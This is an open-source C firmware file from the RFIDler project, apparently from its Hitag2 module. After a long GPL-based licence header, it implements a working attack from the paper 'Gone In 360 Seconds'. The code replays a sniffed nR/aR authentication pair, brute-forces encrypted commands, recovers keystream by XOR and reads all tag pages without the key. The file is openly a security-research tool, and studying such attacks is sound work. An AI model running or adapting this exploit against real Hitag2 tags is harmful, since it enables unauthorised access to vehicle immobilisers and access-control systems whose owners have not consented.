/***************************************************************************
 * A copy of the GNU GPL is appended to this file.                         *
 *                                                                         *
 * This licence is based on the nmap licence, and we express our gratitude *
 * for the work that went into producing it. There is no other connection  *
 * between RFIDler and nmap either expressed or implied.                   *
 *                                                                         *
 ********************** IMPORTANT RFIDler LICENSE TERMS ********************
 *                                                                         *
 *                                                                         *
 * All references to RFIDler herein imply all it's derivatives, namely:    *
 *                                                                         *
 * o RFIDler-LF Standard                                                   *
 * o RFIDler-LF Lite                                                       *
 * o RFIDler-LF Nekkid                                                     *
 *                                                                         *
 *                                                                         *
 * RFIDler is (C) 2013-2017 Aperture Labs Ltd.                             *
 *                                                                         *
 * This program is free software; you may redistribute and/or modify it    *
 * under the terms of the GNU General Public License as published by the   *
 * Free Software Foundation; Version 2 ("GPL"), BUT ONLY WITH ALL OF THE   *
 * CLARIFICATIONS AND EXCEPTIONS DESCRIBED HEREIN.  This guarantees your   *
 * right to use, modify, and redistribute this software under certain      *
 * conditions.  If you wish to embed RFIDler technology into proprietary   *
 * software or hardware, we sell alternative licenses                      *
 * (contact sales@aperturelabs.com).                                       *
 *                                                                         *
 * Note that the GPL places important restrictions on "derivative works",  *
 * yet it does not provide a detailed definition of that term.  To avoid   *
 * misunderstandings, we interpret that term as broadly as copyright law   *
 * allows.  For example, we consider an application to constitute a        *
 * derivative work for the purpose of this license if it does any of the   *
 * following with any software or content covered by this license          *
 * ("Covered Software"):                                                   *
 *                                                                         *
 * o Integrates source code from Covered Software.                         *
 *                                                                         *
 * o Is designed specifically to execute Covered Software and parse the    *
 * results (as opposed to typical shell or execution-menu apps, which will *
 * execute anything you tell them to).                                     *
 *                                                                         *
 * o Includes Covered Software in a proprietary executable installer.  The *
 * installers produced by InstallShield are an example of this.  Including *
 * RFIDler with other software in compressed or archival form does not     *
 * trigger this provision, provided appropriate open source decompression  *
 * or de-archiving software is widely available for no charge.  For the    *
 * purposes of this license, an installer is considered to include Covered *
 * Software even if it actually retrieves a copy of Covered Software from  *
 * another source during runtime (such as by downloading it from the       *
 * Internet).                                                              *
 *                                                                         *
 * o Links (statically or dynamically) to a library which does any of the  *
 * above.                                                                  *
 *                                                                         *
 * o Executes a helper program, module, or script to do any of the above.  *
 *                                                                         *
 * This list is not exclusive, but is meant to clarify our interpretation  *
 * of derived works with some common examples.  Other people may interpret *
 * the plain GPL differently, so we consider this a special exception to   *
 * the GPL that we apply to Covered Software.  Works which meet any of     *
 * these conditions must conform to all of the terms of this license,      *
 * particularly including the GPL Section 3 requirements of providing      *
 * source code and allowing free redistribution of the work as a whole.    *
 *                                                                         *
 * As another special exception to the GPL terms, Aperture Labs Ltd. grants*
 * permission to link the code of this program with any version of the     *
 * OpenSSL library which is distributed under a license identical to that  *
 * listed in the included docs/licenses/OpenSSL.txt file, and distribute   *
 * linked combinations including the two.                                  *
 *                                                                         *
 * Any redistribution of Covered Software, including any derived works,    *
 * must obey and carry forward all of the terms of this license, including *
 * obeying all GPL rules and restrictions.  For example, source code of    *
 * the whole work must be provided and free redistribution must be         *
 * allowed.  All GPL references to "this License", are to be treated as    *
 * including the terms and conditions of this license text as well.        *
 *                                                                         *
 * Because this license imposes special exceptions to the GPL, Covered     *
 * Work may not be combined (even as part of a larger work) with plain GPL *
 * software.  The terms, conditions, and exceptions of this license must   *
 * be included as well.  This license is incompatible with some other open *
 * source licenses as well.  In some cases we can relicense portions of    *
 * RFIDler or grant special permissions to use it in other open source     *
 * software.  Please contact sales@aperturelabs.com with any such requests.*
 * Similarly, we don't incorporate incompatible open source software into  *
 * Covered Software without special permission from the copyright holders. *
 *                                                                         *
 * If you have any questions about the licensing restrictions on using     *
 * RFIDler in other works, are happy to help.  As mentioned above, we also *
 * offer alternative license to integrate RFIDler into proprietary         *
 * applications and appliances.  These contracts have been sold to dozens  *
 * of software vendors, and generally include a perpetual license as well  *
 * as providing for priority support and updates.  They also fund the      *
 * continued development of RFIDler.  Please email sales@aperturelabs.com  *
 * for further information.                                                *
 * If you have received a written license agreement or contract for        *
 * Covered Software stating terms other than these, you may choose to use  *
 * and redistribute Covered Software under those terms instead of these.   *
 *                                                                         *
 * Source is provided to this software because we believe users have a     *
 * right to know exactly what a program is going to do before they run it. *
 * This also allows you to audit the software for security holes (none     *
 * have been found so far).                                                *
 *                                                                         *
 * Source code also allows you to port RFIDler to new platforms, fix bugs, *
 * and add new features.  You are highly encouraged to send your changes   *
 * to the RFIDler mailing list for possible incorporation into the         *
 * main distribution.  By sending these changes to Aperture Labs Ltd. or   *
 * one of the Aperture Labs Ltd. development mailing lists, or checking    *
 * them into the RFIDler source code repository, it is understood (unless  *
 * you specify otherwise) that you are offering the RFIDler Project        *
 * (Aperture Labs Ltd.) the unlimited, non-exclusive right to reuse,       *
 * modify, and relicense the code.  RFIDler will always be available Open  *
 * Source, but this is important because the inability to relicense code   *
 * has caused devastating problems for other Free Software projects (such  *
 * as KDE and NASM).  We also occasionally relicense the code to third     *
 * parties as discussed above. If you wish to specify special license      *
 * conditions of your contributions, just say so when you send them.       *
 *                                                                         *
 * This program is distributed in the hope that it will be useful, but     *
 * WITHOUT ANY WARRANTY; without even the implied warranty of              *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the RFIDler   *
 * license file for more details (it's in a COPYING file included with     *
 * RFIDler, and also available from                                        *
 *   https://github.com/ApertureLabsLtd/RFIDler/COPYING                    *
 *                                                                         *
 ***************************************************************************/

// Author: Kevin Sheldrake <kev@headhacking.com>

#include "HardwareProfile.h"
#include "rfidler.h"
#include "util.h"
#include "hitagcrypto.h"
#include "hitag2crack.h"
#include "hitag.h"


#define READP0CMD "1100000111"
#define ERROR_RESPONSE "F402889C"

extern const BYTE Hitag2Sync[5];
extern BOOL CryptoActive;
extern Hitag_State Hitag_Crypto_State;

// hitag2_crack implements the first crack algorithm described in the paper,
// Gone In 360 Seconds by Verdult, Garcia and Balasch.
// response is a multi-line text response containing the 8 pages of the
// cracked tag;
// nrarhex is a string containing hex representations of the 32 bit nR and aR
// values (separated by a space) snooped using SNIFF-PWM.
BOOL hitag2_crack(BYTE *response, BYTE *nrarhex)
{
    BYTE uidhex[9];
    BYTE uid[32];
    BYTE nrar[64];
    BYTE e_firstcmd[10];
    BYTE e_page0cmd[10];
    BYTE keybits[42];
    BYTE pagehex[9];
    BYTE temp[20];
    int i;
    BYTE *spaceptr = NULL;

    UserMessage("\r\n");
    
    // get uid as hexstring
    if(!hitag2_get_uid(uidhex))
    {
        UserMessage("Cannot get UID\r\n");
        return FALSE;
    }

    // convert uid hexstring to binarray
    hextobinarray(uid, uidhex);
    
    // convert nR and aR hexstrings to binarray
    spaceptr = strchr(nrarhex, ' ');
    if (!spaceptr)
    {
        UserMessage("Please supply a valid nR aR pair\r\n");
        return FALSE;
    }
    *spaceptr = 0x00;
    
    if (hextobinarray(nrar, nrarhex) != 32)
    {
        UserMessage("nR is not 32 bits long\r\n");
        return FALSE;
    }
    
    if (hextobinarray(nrar + 32, spaceptr + 1) != 32)
    {
        UserMessage("aR is not 32 bits long\r\n");
        return FALSE;
    }

    // find a valid encrypted command
    if (!hitag2crack_find_valid_e_cmd(e_firstcmd, nrar))
    {
        UserMessage("Cannot find a valid encrypted command\r\n");
        return FALSE;
    }
    
    // find the 'read page 0' command and recover key stream
    if (!hitag2crack_find_e_page0_cmd(keybits, e_firstcmd, nrar, uid))
    {
        UserMessage("Cannot find encrypted 'read page0' command\r\n");
        return FALSE;
    }
    
    // empty the response string
    response[0] = 0x00;
    
    // read all pages using key stream
    for (i=0; i<8; i++)
    {
        if (hitag2crack_read_page(pagehex, i, nrar, keybits))
        {
            sprintf(temp, "%1d: %s\r\n", i, pagehex);
        }
        else
        {
            sprintf(temp, "%1d:\r\n", i);
        }
        // add page string to response
        strcat(response, temp);
    }
    
    return TRUE;
}

// hitag2crack_find_valid_e_cmd repeatedly replays the auth protocol each
// with a different sequential encrypted command value in order to find one
// that returns a valid response.
// e_cmd is the returned binarray of the valid encrypted command;
// nrar is the binarray of the 64 bit nR aR pair.
BOOL hitag2crack_find_valid_e_cmd(BYTE e_cmd[], BYTE nrar[])
{
    BYTE guess[10];
    BYTE responsestr[9];
    BYTE a, b, c, d, e, g;
    
    UserMessage("Finding valid encrypted command:");
    // we're going to hold bits 5, 7, 8 and 9 and brute force the rest
    // e.g. x x x x x 0 x 0 0 0
    for (a=0; a<2; a++)
    {
        for (b=0; b<2; b++)
        {
            for (c=0; c<2; c++)
            {
                for (d=0; d<2; d++)
                {
                    for (e=0; e<2; e++)
                    {
                        for (g=0; g<2; g++)
                        {
                            // build binarray
                            guess[0] = a;
                            guess[1] = b;
                            guess[2] = c;
                            guess[3] = d;
                            guess[4] = e;
                            guess[5] = 0;
                            guess[6] = g;
                            guess[7] = 0;
                            guess[8] = 0;
                            guess[9] = 0;

                            // send guess
                            if (hitag2crack_send_e_cmd(responsestr, nrar, guess, 10))
                            {
                                // check if it was valid
                                if (strcmp(responsestr, ERROR_RESPONSE) != 0)
                                {
                                    // return the guess as the encrypted command
                                    memcpy(e_cmd, guess, 10);
                                    UserMessage("\r\n");
                                    return TRUE;
                                }
                            }
                            else
                            {
#ifdef RFIDLER_DEBUG
                                UserMessage("hitag2crack_find_valid_e_cmd:\r\n hitag2crack_send_e_cmd failed\r\n");
#endif
                            }
                            UserMessage(".");
                        }
                    }
                }
            }
        }
    }
    
    UserMessage("hitag2crack_find_valid_e_cmd:\r\n no valid encrypted command found\r\n");
    return FALSE;
}

// hitag2crack_find_e_page0_cmd tries all bit-flipped combinations of the
// valid encrypted command and tests the results by attempting an extended
// command version of the command to see if that produces a valid response.
// keybits is the returned binarray of the recovered key stream;
// e_page0cmd is the returned binarray of the encrypted 'read page 0' command;
// e_firstcmd is the binarray of the first valid encrypted command found;
// nrar is the binarray of the 64 bit nR aR pair;
// uid is the binarray of the 32 bit UID.
BOOL hitag2crack_find_e_page0_cmd(BYTE keybits[], BYTE e_firstcmd[], BYTE nrar[], BYTE uid[])
{
    BYTE a, b, c, d;
    BYTE guess[10];
    BYTE responsestr[9];
    BYTE e_uid[32];

    UserMessage("Finding 'read page 0' command:");
    // we're going to brute the missing 4 bits of the valid encrypted command
    for (a=0; a<2; a++)
    {
        for (b=0; b<2; b++)
        {
            for (c=0; c<2; c++)
            {
                for (d=0; d<2; d++)
                {
                    // create our guess by bit flipping the pattern of bits
                    // representing the inverted bit and the 3 page bits
                    // in both the non-inverted and inverted parts of the
                    // encrypted command.
                    memcpy(guess, e_firstcmd, 10);
                    if (a)
                    {
                        guess[5] = !guess[5];
                        guess[0] = !guess[0];
                    }
                    if (b)
                    {
                        guess[7] = !guess[7];
                        guess[2] = !guess[2];
                    }
                    if (c)
                    {
                        guess[8] = !guess[8];
                        guess[3] = !guess[3];
                    }
                    if (d)
                    {
                        guess[9] = !guess[9];
                        guess[4] = !guess[4];
                    }
                    
                    // try the guess
                    if (hitag2crack_send_e_cmd(responsestr, nrar, guess, 10))
                    {
                        // check if it was valid
                        if (strcmp(responsestr, ERROR_RESPONSE) != 0)
                        {
                            // convert response to binarray
                            hextobinarray(e_uid, responsestr);
                            // test if the guess was 'read page 0' command
                            if (hitag2crack_test_e_p0cmd(keybits, nrar, guess, uid, e_uid))
                            {
                                UserMessage("\r\n");
                                return TRUE;
                            }
                        }
                        else
                        {
#ifdef RFIDLER_DEBUG
                            UserMessage("hitag2crack_find_e_page0_cmd:\r\n hitag2crack_send_e_cmd returned ERROR_RESPONSE\r\n");
#endif
                        }
                    }
                    else
                    {
 #ifdef RFIDLER_DEBUG                       
                        UserMessage("hitag2crack_find_e_page0_cmd:\r\n hitag2crack_send_e_cmd failed\r\n");
#endif
                    }
                    UserMessage(".");
                }
            }
        }
    }
    UserMessage("hitag2crack_find_e_page0_cmd:\r\n could not find encrypted 'read page 0' command\r\n");
    return FALSE;
}

// hitag2crack_test_e_p0cmd XORs the message (command + response) with the
// encrypted version to retrieve the key stream.  It then uses this key stream
// to encrypt an extended version of the READP0CMD and tests if the response
// is valid.
// keybits is the returned binarray of the key stream;
// nrar is the 64 bit binarray of nR aR pair;
// e_cmd is the binarray of the encrypted command;
// uid is the binarray of the card UID;
// e_uid is the binarray of the encrypted version of the UID.
BOOL hitag2crack_test_e_p0cmd(BYTE *keybits, BYTE *nrar, BYTE *e_cmd, BYTE *uid, BYTE *e_uid)
{
    BYTE cipherbits[42];
    BYTE plainbits[42];
    BYTE ext_cmd[40];
    BYTE e_ext_cmd[40];
    BYTE responsestr[9];
    int i;
    
    // copy encrypted cmd to cipherbits
    memcpy(cipherbits, e_cmd, 10);
    
    // copy encrypted uid to cipherbits
    memcpy(cipherbits + 10, e_uid, 32);
    
    // copy cmd to plainbits
    binstringtobinarray(plainbits, READP0CMD);
    
    // copy uid to plainbits
    memcpy(plainbits + 10, uid, 32);

    // xor the plainbits with the cipherbits to get keybits
    hitag2crack_xor(keybits, plainbits, cipherbits, 42);
    
    // create extended cmd -> 4 * READP0CMD = 40 bits
    for (i=0; i<4; i++)
    {
        binstringtobinarray(ext_cmd + (i * 10), READP0CMD);
    }
    
    // xor extended cmd with keybits
    hitag2crack_xor(e_ext_cmd, ext_cmd, keybits, 40);
    
    // send extended encrypted cmd
    if (hitag2crack_send_e_cmd(responsestr, nrar, e_ext_cmd, 40))
    {
        // test if it was valid
        if (strcmp(responsestr, ERROR_RESPONSE) != 0)
        {
            return TRUE;
        }
    }
    else
    {
#ifdef RFIDLER_DEBUG
        UserMessage("hitag2crack_test_e_p0cmd:\r\n hitag2crack_send_e_cmd failed\r\n");
#endif
    }
    
    return FALSE;
    
}

// hitag2crack_xor XORs the source with the pad to produce the target.
// source, target and pad are binarrays of length len.
void hitag2crack_xor(BYTE *target, BYTE *source, BYTE *pad, unsigned int len)
{
    int i;

    for (i=0; i<len; i++)
    {
        target[i] = source[i] ^ pad[i];
    }
}

// hitag2crack_read_page uses the supplied key stream and nrar pair to read the
// given page, returning the response as a hexstring.
// responsestr is the returned hexstring;
// pagenum is the page number to read;
// nrar is the 64 bit binarray of the nR aR pair;
// keybits is the binarray of the key stream.
BOOL hitag2crack_read_page(BYTE *responsestr, BYTE pagenum, BYTE *nrar, BYTE *keybits)
{
    BYTE cmd[10];
    BYTE e_cmd[10];
    BYTE e_responsestr[9];
    BYTE e_response[32];
    BYTE response[32];
    int i;
    
    if ((pagenum < 0) || (pagenum > 7))
    {
        UserMessage("hitag2crack_read_page:\r\n invalid pagenum\r\n");
        return FALSE;
    }
    
    // create cmd
    binstringtobinarray(cmd, READP0CMD);
    if (pagenum & 0x1)
    {
        cmd[9] = !cmd[9];
        cmd[4] = !cmd[4];
    }
    if (pagenum & 0x2)
    {
        cmd[8] = !cmd[8];
        cmd[3] = !cmd[3];
    }
    if (pagenum & 0x4)
    {
        cmd[7] = !cmd[7];
        cmd[2] = !cmd[2];
    }
    
    // encrypt command
    hitag2crack_xor(e_cmd, cmd, keybits, 10);
    
    // send encrypted command
    if (hitag2crack_send_e_cmd(e_responsestr, nrar, e_cmd, 10))
    {
        // check if it is valid
        if (strcmp(e_responsestr, ERROR_RESPONSE) != 0)
        {
            // convert to binarray
            hextobinarray(e_response, e_responsestr);
            // decrypt response
            hitag2crack_xor(response, e_response, keybits + 10, 32);
            // convert to hexstring
            binarraytohex(responsestr, response, 32);
            return TRUE;
        }
        else
        {
            UserMessage("hitag2crack_read_page:\r\n hitag2crack_send_e_cmd returned ERROR_RESPONSE\r\n");
        }
    }
    else
    {
        UserMessage("hitag2crack_read_page:\r\n hitag2crack_send_e_cmd failed\r\n");
    }
    
    return FALSE;
}

// hitag2crack_send_e_cmd replays the auth and sends the given encrypted
// command.
// responsestr is the hexstring of the response to the command;
// nrar is the 64 bit binarray of the nR aR pair;
// cmd is the binarray of the encrypted command to send;
// len is the length of the encrypted command.
BOOL hitag2crack_send_e_cmd(BYTE *responsestr, BYTE *nrar, BYTE *cmd, int len)
{
    BYTE tmp[37];
    BYTE uid[9];
    BYTE e_page3str[9];
    int ret = 0;

    // get the UID
    if(!hitag2_get_uid(uid))
    {
        UserMessage("hitag2crack_send_e_cmd:\r\n cannot get UID\r\n");
        return FALSE;
    }

    // START_AUTH kills active crypto session
    CryptoActive = FALSE;

    // get the UID again
    if(!hitag2_get_uid(uid))
    {
        UserMessage("hitag2crack_send_e_cmd:\r\n cannot get UID (2nd time)\r\n");
        return FALSE;
    }
    
    // send nrar and receive (useless) encrypted page 3 value
    if (!hitag2crack_tx_rx(e_page3str, nrar, 64, RWD_STATE_WAKING, FALSE))
    {
        UserMessage("hitag2crack_send_e_cmd:\r\n tx/rx nrar failed\r\n");
        return FALSE;
    }
                
    // send encrypted command
    if (!hitag2crack_tx_rx(responsestr, cmd, len, RWD_STATE_WAKING, FALSE))
    {
#ifdef RFIDLER_DEBUG
        UserMessage("hitag2crack_send_e_cmd:\r\n tx/rx cmd failed\r\n");
#endif
        return FALSE;
    }

    return TRUE;
}

// hitag2crack_tx_rx transmits a message and receives a response.
// responsestr is the hexstring of the response;
// msg is the binarray of the message to send;
// state is the RWD state;
// reset indicates whether to reset RWD state after.
BOOL hitag2crack_tx_rx(BYTE *responsestr, BYTE *msg, int len, int state, BOOL reset)
{
    BYTE tmp[37];
    int ret = 0;

    // START_AUTH kills active crypto session
    CryptoActive= FALSE;
    
    if(!rwd_send(msg, len, reset, BLOCK, state, RFIDlerConfig.FrameClock, 0, RFIDlerConfig.RWD_Wait_Switch_RX_TX, RFIDlerConfig.RWD_Zero_Period, RFIDlerConfig.RWD_One_Period, RFIDlerConfig.RWD_Gap_Period, RFIDlerConfig.RWD_Wait_Switch_TX_RX))
    {
        UserMessage("hitag2crack_tx_rx: rwd_send failed\r\n");
        return FALSE;
    }
    
    // skip 1/2 bit to synchronise manchester
    HW_Skip_Bits = 1;
    ret = read_ask_data(RFIDlerConfig.FrameClock, RFIDlerConfig.DataRate, tmp, 37, RFIDlerConfig.Sync, RFIDlerConfig.SyncBits, RFIDlerConfig.Timeout, ONESHOT_READ, BINARY);

    // check if response was a valid length (5 sync bits + 32 bits response)
    if (ret == 37)
    {
        // check sync bits
        if (memcmp(tmp, Hitag2Sync, 5) != 0)
        {
            UserMessage("hitag2crack_tx_rx: no sync\r\n");
            return FALSE;
        }
        
        // convert response to hexstring
        binarraytohex(responsestr, tmp + 5, 32);
        return TRUE;
    } 
    else
    {
#ifdef RFIDLER_DEBUG
        UserMessage("hitag2crack_tx_rx: wrong rx len\r\n");
#endif
        return FALSE;
    }
    return FALSE;
}


BOOL hitag2crack_rng_init(BYTE *response, BYTE *input)
{
    uint64_t sharedkey;
    uint32_t serialnum;
    uint32_t initvector;
    BYTE *spaceptr;
    BYTE *dataptr;
    
    // extract vals from input
    dataptr = input;
    spaceptr = strchr(dataptr, ' ');
    if (!spaceptr)
    {
        UserMessage("/r/nformat is 'sharedkey UID nR' in hex\r\n");
        return FALSE;
    }
    
    *spaceptr = 0x00;
    
    if (strlen(dataptr) != 12)
    {
        UserMessage("/r/nsharedkey should be 48 bits long (12 hexchars)\r\n");
        return FALSE;
    }

    sharedkey = rev64(hexreversetoulonglong(dataptr));
    
    dataptr = spaceptr+1;
    spaceptr = strchr(dataptr, ' ');
    if (!spaceptr)
    {
        UserMessage("/r/nno UID\r\n");
        return FALSE;
    }
    
    *spaceptr = 0x00;
    if (strlen(dataptr) != 8)
    {
        UserMessage("/r/nUID should be 32 bits long (8 hexchars)\r\n");
        return FALSE;
    }
    
    serialnum = rev32(hexreversetoulong(dataptr));
    
    dataptr = spaceptr+1;
    
    if (strlen(dataptr) != 8)
    {
        UserMessage("/r/nnR should be 32 bits long (8 hexchars)\r\n");
        return FALSE;
    }
    
    initvector = rev32(hexreversetoulong(dataptr));
    
    // start up crypto engine
    hitag2_init(&Hitag_Crypto_State, sharedkey, serialnum, initvector);
    
    strcpy(response, "Success\r\n");
    
    return TRUE;
}

BOOL hitag2crack_decrypt_hex(BYTE *response, BYTE *hex)
{
    BYTE bin[32];
    BYTE binhex[9];
    BYTE binstr[33];
    uint32_t binulong;
 
    if (strlen(hex) != 8)
    {
        UserMessage("/r/nhex must be 32bits (8 hex chars)\r\n");
        return FALSE;
    }
    
    binulong = hextoulong(hex);
    
    ulongtobinarray(bin, hitag2_crypt(binulong, 32), 32);
    binarraytobinstring(binstr, bin, 32);
    binarraytohex(binhex, bin, 32);
//    UserMessage("ar = %s\r\n", binstr);
//    UserMessage("arhex = %s\r\n", binhex);
    
    strcpy(response, binhex);
    return TRUE;
}

BOOL hitag2crack_decrypt_bin(BYTE *response, BYTE *e_binstr)
{
    BYTE bin[32];
    BYTE e_bin[32];
    BYTE binstr[33];
    uint32_t binulong;
    int len;
 
    len = strlen(e_binstr);
    if (len > 32)
    {
        UserMessage("\r\nbinary string must be <= 32 bits\r\n");
        return FALSE;
    }
    
    binstringtobinarray(e_bin, e_binstr);
    binulong = binarraytoulong(e_bin, len);
    
    ulongtobinarray(bin, hitag2_crypt(binulong, len), len);
    binarraytobinstring(binstr, bin, len);
    strcpy(response, binstr);
    return TRUE;
}

BOOL hitag2crack_encrypt_hex(BYTE *response, BYTE *hex)
{
    // XOR pad so encrypt == decrypt :)
    return hitag2crack_decrypt_hex(response, hex);
}

BOOL hitag2crack_encrypt_bin(BYTE *response, BYTE *e_binstr)
{
    return hitag2crack_decrypt_bin(response, e_binstr);
}
    
// hitag2_keystream uses the first crack algorithm described in the paper,
// Gone In 360 Seconds by Verdult, Garcia and Balasch, to retrieve 2048 bits
// of keystream.
// response is a multi-line text response containing the hex of the keystream;
// nrarhex is a string containing hex representations of the 32 bit nR and aR
// values (separated by a space) snooped using SNIFF-PWM.
BOOL hitag2_keystream(BYTE *response, BYTE *nrarhex)
{
    BYTE uidhex[9];
    BYTE uid[32];
    BYTE nrar[64];
    BYTE e_firstcmd[10];
    BYTE e_page0cmd[10];
//    BYTE keybits[2080];
    BYTE *keybits = DataBuff;
    BYTE keybitshex[67];
    int kslen;
    int ksoffset;
    BYTE pagehex[9];
    BYTE temp[20];
    int i;
    BYTE *spaceptr = NULL;

    UserMessage("\r\n");

/*    
    keybits = malloc(2080);
    if (!keybits) {
        UserMessage("cannot malloc keybits\r\n");
        return FALSE;
    }
*/
    
    // get uid as hexstring
    if(!hitag2_get_uid(uidhex))
    {
        UserMessage("Cannot get UID\r\n");
        return FALSE;
    }

    // convert uid hexstring to binarray
    hextobinarray(uid, uidhex);
    
    // convert nR and aR hexstrings to binarray
    spaceptr = strchr(nrarhex, ' ');
    if (!spaceptr)
    {
        UserMessage("Please supply a valid nR aR pair\r\n");
        return FALSE;
    }
    *spaceptr = 0x00;
    
    if (hextobinarray(nrar, nrarhex) != 32)
    {
        UserMessage("nR is not 32 bits long\r\n");
        return FALSE;
    }
    
    if (hextobinarray(nrar + 32, spaceptr + 1) != 32)
    {
        UserMessage("aR is not 32 bits long\r\n");
        return FALSE;
    }

    // find a valid encrypted command
    if (!hitag2crack_find_valid_e_cmd(e_firstcmd, nrar))
    {
        UserMessage("Cannot find a valid encrypted command\r\n");
        return FALSE;
    }
    
    // find the 'read page 0' command and recover key stream
    if (!hitag2crack_find_e_page0_cmd(keybits, e_firstcmd, nrar, uid))
    {
        UserMessage("Cannot find encrypted 'read page0' command\r\n");
        return FALSE;
    }
    
    // using the 40 bits of keystream in keybits, sending commands with ever
    // increasing lengths to acquire 2048 bits of key stream.
    kslen = 40;
    
    while (kslen < 2048)
    {
        ksoffset = 0;
        if (!hitag2crack_send_auth(nrar))
        {
            UserMessage("hitag2crack_send_auth failed\r\n");
            return FALSE;
        }
        // while we have at least 52 bits of keystream, consume it with
        // extended read page 0 commands. 52 = 10 (min command len) +
        // 32 (response) + 10 (min command len we'll send)
        while ((kslen - ksoffset) >= 52)
        {
            // consume the keystream, updating ksoffset as we go
            if (!hitag2crack_consume_keystream(keybits, kslen, &ksoffset, nrar))
            {
                UserMessage("hitag2crack_consume_keystream failed\r\n");
                return FALSE;
            }
        }
        // send an extended command to retrieve more keystream, updating kslen
        // as we go
        if (!hitag2crack_extend_keystream(keybits, &kslen, ksoffset, nrar, uid))
        {
            UserMessage("hitag2crack_extend_keystream failed\r\n");
            return FALSE;
        }
        UserMessage("Recovered %d bits of keystream\r\n", kslen);

    }
    
    for (i=0; i<2048; i+=256)
    {
        binarraytohex(keybitshex, keybits + i, 256);
        UserMessage("%s\r\n", keybitshex);
    }

    response[0] = 0x00;
    
    return TRUE;
}

// hitag2crack_send_auth replays the auth and returns.
// nrar is the 64 bit binarray of the nR aR pair;
BOOL hitag2crack_send_auth(BYTE *nrar)
{
    BYTE uid[9];
    BYTE e_page3str[9];

    // get the UID
    if(!hitag2_get_uid(uid))
    {
        UserMessage("hitag2crack_send_auth:\r\n cannot get UID\r\n");
        return FALSE;
    }

    // START_AUTH kills active crypto session
    CryptoActive = FALSE;

    // get the UID again
    if(!hitag2_get_uid(uid))
    {
        UserMessage("hitag2crack_send_auth:\r\n cannot get UID (2nd time)\r\n");
        return FALSE;
    }
    
    // send nrar and receive (useless) encrypted page 3 value
    if (!hitag2crack_tx_rx(e_page3str, nrar, 64, RWD_STATE_WAKING, FALSE))
    {
        UserMessage("hitag2crack_send_auth:\r\n tx/rx nrar failed\r\n");
        return FALSE;
    }
    return TRUE;
}

// hitag2crack_consume_keystream sends an extended command (up to 510 bits in
// length) to consume keystream.
// keybits is the binarray of keystream bits;
// kslen is the length of keystream;
// ksoffset is a pointer to the current keystream offset (updated by this fn);
// nrar is the 64 bit binarray of the nR aR pair.
BOOL hitag2crack_consume_keystream(BYTE *keybits, int kslen, int *ksoffset, BYTE *nrar)
{
    int conlen;
    int numcmds;
    int i;
    BYTE ext_cmd[510];
    BYTE e_ext_cmd[510];
    BYTE responsestr[9];

    // calculate the length of keybits to consume with the extended command.
    // 42 = 32 bit response + 10 bit command reserved for next command.  conlen
    // cannot be longer than 510 bits to fit into the small RWD buffer.
    conlen = kslen - *ksoffset - 42;
    if (conlen < 10)
    {
        UserMessage("hitag2crack_consume_keystream:\r\n conlen < 10\r\n");
        return FALSE;
    }
    
    // sanitise conlen
    if (conlen > 510)
    {
        conlen = 510;
    }
    
    // calculate how many repeated commands to send in this extended command.
    numcmds = conlen / 10;
    
    // build extended command
    for (i=0; i<numcmds; i++)
    {
        binstringtobinarray(ext_cmd + (i * 10), READP0CMD);
    }

    // xor extended cmd with keybits
    hitag2crack_xor(e_ext_cmd, ext_cmd, keybits + *ksoffset, numcmds * 10);
    
    // send encrypted command
    if (!hitag2crack_tx_rx(responsestr, e_ext_cmd, numcmds * 10, RWD_STATE_WAKING, FALSE))
    {
        UserMessage("hitag2crack_consume_keystream:\r\n tx/rx cmd failed\r\n");
        return FALSE;
    }
    
    // test response
    if (strcmp(responsestr, ERROR_RESPONSE) == 0)
    {
        UserMessage("hitag2crack_consume_keystream:\r\n got error response from card\r\n");
        return FALSE;
    }
    
    // dont bother decrypting the response - we already know the keybits
    
    // update ksoffset with command length and response
    *ksoffset += (numcmds * 10) + 32;
}

// hitag2crack_extend_keystream sends an extended command to retrieve more keybits.
// keybits is the binarray of the keystream bits;
// kslen is a pointer to the current keybits length;
// ksoffset is the offset into the keybits array;
// nrar is the 64 bit binarray of the nR aR pair;
// uid is the 32 bit binarray of the UID.
BOOL hitag2crack_extend_keystream(BYTE *keybits, int *kslen, int ksoffset, BYTE *nrar, BYTE *uid)
{
    int cmdlen;
    int numcmds;
    BYTE ext_cmd[510];
    BYTE e_ext_cmd[510];
    BYTE responsestr[9];
    BYTE e_response[32];
    int i;
    
    // calc number of command iterations to send
    cmdlen = *kslen - ksoffset;
    if (cmdlen < 10)
    {
        UserMessage("hitag2crack_extend_keystream:\r\n cmdlen < 10\r\n");
        return FALSE;
    }
    
    numcmds = cmdlen / 10;
       
    // build extended command
    for (i=0; i<numcmds; i++)
    {
        binstringtobinarray(ext_cmd + (i * 10), READP0CMD);
    }
    
    // xor extended cmd with keybits
    hitag2crack_xor(e_ext_cmd, ext_cmd, keybits + ksoffset, numcmds * 10);
    
    // send extended encrypted cmd
    if (!hitag2crack_tx_rx(responsestr, e_ext_cmd, numcmds * 10, RWD_STATE_WAKING, FALSE))
    {
        UserMessage("hitag2crack_extend_keystream:\r\n tx/rx cmd failed\r\n");
        return FALSE;
    }
    
    // test response
    if (strcmp(responsestr, ERROR_RESPONSE) == 0)
    {
        UserMessage("hitag2crack_extend_keystream:\r\n got error response from card\r\n");
        return FALSE;
    }

    // convert response to binarray
    hextobinarray(e_response, responsestr);

    // recover keystream from encrypted response
    hitag2crack_xor(keybits + ksoffset + (numcmds * 10), e_response, uid, 32);

    // update kslen
    *kslen = ksoffset + (numcmds * 10) + 32;
    
    return TRUE;

}

BOOL hitag2_reader(BYTE *response, BYTE *key, BOOL interactive)
{
    BYTE tmp[9];
    int i;
    
    response[0] = '\0';
    // auth to tag
    if (hitag2_crypto_auth(tmp, key))
    {
        // read tag, one page at a time
        for (i= 0; i <= 7; ++i)
        {
            if(!read_tag(tmp, i, i))
            {
                // if read fails, it could be because of auth,
                // so try to reauth
                if (!hitag2_crypto_auth(tmp, key))
                {
                    // if we can't reauth, it's a real failure
                    return FALSE;
                }
                // temp failure (probably due to page protections)
                strcpy(tmp, "XXXXXXXX");               
            }
            // page contents are in tmp
            strcat(response, tmp);
        }    

        if (interactive)
            {
                tmp[8]= '\0';
                for(i= 0; i <= 7 ; ++i)
                {
                    UserMessageNum("%d: ", i);
                    memcpy(tmp, response + (i * 8), 8);
                    UserMessage("%s\r\n", tmp);
                }
                UserMessage("%s", "\r\n");
            }
            else
            {
                hitag2_nvm_store_tag(response);
            }
            return TRUE;
    }
    else
    {
        return FALSE;
    }
}

void hitag2_nvm_clear()
{
